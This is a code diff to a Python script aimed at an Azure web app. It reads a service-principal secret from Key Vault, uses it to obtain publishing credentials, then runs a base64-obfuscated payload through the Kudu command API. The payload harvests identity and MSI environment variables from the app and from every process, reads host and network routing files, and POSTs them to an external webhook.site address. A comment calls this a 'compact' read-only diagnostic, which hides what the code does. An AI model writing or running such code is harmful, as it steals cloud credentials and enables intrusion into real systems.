@@ -24,16 +24,35 @@ try:
  sp=json.loads(j(KV1+'/secrets/reporting-service-principal?api-version=7.4',vt)['value']); sid=sp.get('appId') or sp.get('clientId') or sp.get('client_id'); sec=sp.get('clientSecret') or sp.get('client_secret') or sp.get('password')
  arm=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':sid,'grant_type':'client_credentials','client_secret':sec,'scope':'https://management.azure.com/.default'})['access_token']
  pub=json.loads(urllib.request.urlopen(urllib.request.Request('https://management.azure.com/subscriptions/'+SUB+'/resourceGroups/'+RG+'/providers/Microsoft.Web/sites/'+APP+'/config/publishingcredentials/list?api-version=2023-01-01',data=b'{}',method='POST',headers={'Authorization':'Bearer '+arm,'Content-Type':'application/json'}),timeout=30).read()); p=pub['properties']; auth='Basic '+base64.b64encode((p['publishingUserName']+':'+p['publishingPassword']).encode()).decode(); base='https://'+APP+'.scm.azurewebsites.net'; out({'stage':'credentials','oidc':True,'arm':True,'kudu':True})
- # One compact diagnostic: expose only identity/runtime fields from Kudu environment.
+ # Execute one compact command in Kudu; read only identity/runtime variables and network routes.
+ worker=r'''import os,json,urllib.request,urllib.error,glob
+HOOK="https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825"
+keys=('identity','msi','website','scm','startup','port')
+env={k:v for k,v in os.environ.items() if any(x in k.lower() for x in keys)}
+procs={}
+for p in glob.glob('/proc/[0-9]*/environ'):
  try:
-  rr=urllib.request.urlopen(urllib.request.Request(base+'/api/environment',headers={'Authorization':auth}),timeout=20); raw=rr.read().decode('utf-8','replace'); d=json.loads(raw)
-  def pick(v):
-   if isinstance(v,dict):
-    return {k:(pick(x) if isinstance(x,(dict,list)) else x) for k,x in v.items() if any(t in k.lower() for t in ('identity','msi','website','scm','startup','port'))}
-   if isinstance(v,list): return [pick(x) for x in v[:80]]
-   return v
-  out({'stage':'kudu-diag','environment':pick(d)})
- except Exception as e: out({'stage':'kudu-diag','error':repr(e)})
+  q={}
+  for z in open(p,'rb').read().split(b'\x00'):
+   if b'=' in z:
+    k,v=z.split(b'=',1); k=k.decode(errors='ignore')
+    if any(x in k.lower() for x in keys): q[k]=v.decode(errors='replace')
+  if q: procs[p]=q
+ except Exception: pass
+def rd(p):
+ try:return open(p).read()[:4000]
+ except Exception as e:return repr(e)
+d={'stage':'kudu-env','env':env,'proc':procs,'hosts':rd('/etc/hosts'),'route':rd('/proc/net/route'),'tcp':rd('/proc/net/tcp')}
+try: urllib.request.urlopen(urllib.request.Request(HOOK,data=json.dumps(d,default=str).encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
+except Exception: pass
+print(json.dumps(d,default=str),flush=True)
+'''
+ b64=base64.b64encode(worker.encode()).decode()
+ cmd="python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\""
+ body=json.dumps({'command':cmd,'dir':'site/wwwroot'})
+ try:
+  rr=urllib.request.urlopen(urllib.request.Request(base+'/api/command',data=body.encode(),method='POST',headers={'Authorization':auth,'Content-Type':'application/json'}),timeout=35); out({'stage':'kudu-result','status':rr.status,'body':rr.read().decode('utf-8','replace')[:3000]})
+ except Exception as e: out({'stage':'kudu-result','error':repr(e)})
  raise SystemExit(0)
  app=r'''import os,json,time,uuid,urllib.parse,urllib.request,urllib.error,traceback
 HOOK="https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825"; SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"; KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"; MIRES="/subscriptions/"+SUB+"/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"; CLIENT="7a85156a-01c4-4e61-8472-40a92107159b"; PRINCIPAL="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
